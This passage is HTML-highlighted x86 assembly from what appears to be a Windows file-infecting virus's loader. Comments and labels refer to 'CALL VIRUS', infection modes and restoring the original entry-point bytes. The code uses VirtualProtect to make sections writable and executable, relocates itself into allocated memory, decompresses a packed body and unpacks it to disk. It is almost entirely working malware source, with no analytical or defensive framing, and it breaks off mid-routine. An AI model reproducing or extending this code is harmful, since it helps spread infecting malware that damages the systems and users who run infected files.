   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_section_size</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">  </span><span class="sc1">;  size size</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_loader_section_src</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_VirtualProtect</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_api_addr_ini</span><span class="sc4">)]</span><span class="sc0">

   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

   </span><span class="sc1">;  copying api's address from stack to body</span><span class="sc0">

   </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsd</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_api_addr_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_api_addr_ini</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc5">x_pop</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">l_size</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_compressed_code_place</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">_infect_mode_1</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_mode_loader_0</span><span class="sc0"> </span><span class="sc1">;  0</span><span class="sc0">
   </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_mode_loader_0</span><span class="sc0"> </span><span class="sc1">;  1</span><span class="sc0">
   </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_mode_loader_2</span><span class="sc0"> </span><span class="sc1">;  2</span><span class="sc0">
   </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc1">;   jz _mode_loader_3 ;  3</span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">_mode_loader_0</span><span class="sc0">

   </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">DEPACKER.INC</span><span class="sc0">

   </span><span class="sc5">delta</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0e8h</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
   </span><span class="sc5">_mem_total</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">

   </span><span class="sc5">_mode_loader_0</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc1">;  before restore the bytes, we should</span><span class="sc0">
   </span><span class="sc1">;  unlock the specified memory</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc5">pfdwOldProtect_2</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PAGE_EXECUTE_READWRITE</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
   </span><span class="sc5">_replaced_api_section_sz</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_replaced_api_section_src</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_protect?</span><span class="sc0">

   </span><span class="sc1">;  we've to extract the 5 original bytes from</span><span class="sc0">
   </span><span class="sc1">;  the entrypoint</span><span class="sc0">
   </span><span class="sc1">;  "CALL VIRUS"</span><span class="sc0">

   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">)+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">1</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">)+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">1</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc0">

   </span><span class="sc5">_infect_orig_bytes</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">movsd</span><span class="sc0">
   </span><span class="sc6">movsb</span><span class="sc0">

   </span><span class="sc1">;  retore the old access</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">pfdwOldProtect_2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_replaced_api_section_sz</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_replaced_api_section_src</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_protect?</span><span class="sc0">

   </span><span class="sc1">;  restoring the original section access</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">pfdwOldProtect</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_section_size</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">  </span><span class="sc1">;  size</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_replaced_api_section_src</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_protect?</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">l_ok</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_unpack_to_disk</span><span class="sc0">

   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc6">popf</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">_mode_loader_2</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc1">;  copy all this code to memory and depack</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_mem_total</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_GlobalAlloc</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">l_start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">l_start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">__start_loader_runtime</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">l_start</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_4</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">l_start</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

   </span><span class="sc6">ret</span><span class="sc0">   </span><span class="sc1">;  never works</span><span class="sc0">

   </span><span class="sc5">_4</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_loader_entry_point</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">l_start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">l_size</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc5">pfdwOldProtect_3</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PAGE_EXECUTE_READWRITE</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_section_size</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_loader_section_src</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_protect?</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_aP_depack_asm</span><span class="sc0">

   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_compressed_code_place</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">pfdwOldProtect_3</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_section_size</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">  </span><span class="sc1">;  size</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_loader_section_src</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_protect?</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_GlobalFree</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">s_ret</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">l_ok</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_unpack_to_disk</span><span class="sc0">

   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc6">popf</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
   </span><span class="sc5">s_ret</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">l_ok</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc5">x_push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LOADER</span><span class="sc4">|</span><span class="sc5">OK</span><span class="sc4">~</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MessageBox</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc5">x_pop</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">_protect?</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">pushad</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;  pointer to pfdwOldProtect</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;  PAGE_EXECUTE_READWRITE</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;  section_sz</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">08</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;  section_off</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_VirtualProtect</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">

   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">

   </span><span class="sc5">pfdwOldProtect</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">_section_size</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

   </span><span class="sc5">_loader_entry_point</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">

   </span><span class="sc1">;  RVA </span><span class="sc0">

   </span><span class="sc5">__entry</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">

   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc2">.32</span><span class="sc0">

   </span><span class="sc5">_replaced_api_section_src</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">

   </span><span class="sc1">;  RVA </span><span class="sc0">

   </span><span class="sc5">_replaced_api_section</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">

   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc2">.32</span><span class="sc0">

   </span><span class="sc5">_loader_section_src</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc1">;  we can be in a .DLL file</span><span class="sc0">
   </span><span class="sc1">;  so let's calc. the true address</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">

   </span><span class="sc1">;  RVA</span><span class="sc0">

   </span><span class="sc5">_loader_memory_protect?</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">

   </span><span class="sc2">.32</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0b9h</span><span class="sc0">  </span><span class="sc1">;  mov ecx, 0</span><span class="sc0">
   </span><span class="sc5">__start_loader_runtime</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc2">.34</span><span class="sc0">

